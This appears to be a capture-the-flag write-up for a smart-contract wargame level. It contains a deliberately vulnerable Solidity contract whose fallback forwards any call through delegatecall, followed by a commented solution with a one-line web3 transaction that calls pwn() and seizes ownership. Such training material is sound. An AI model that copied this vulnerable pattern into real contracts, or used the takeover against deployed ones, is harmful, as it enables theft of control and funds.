// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: The goal of this level is for you to claim ownership of the instance you are given.




// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}



//SOLUTION
//- We just need to make a delegatecall from the Delegation contract to the Delegate contact and execute pwn() function 
//- this will cause the pwn code to run on the storage context of the Delegation contract and we will be able to update the owner this way
//- to produce the right parameters for this call we can use the soliditySha3 function of web3.utils which does the same as keccak256()


//  await contract.sendTransaction({from:player, data: web3.utils.soliditySha3("pwn()")})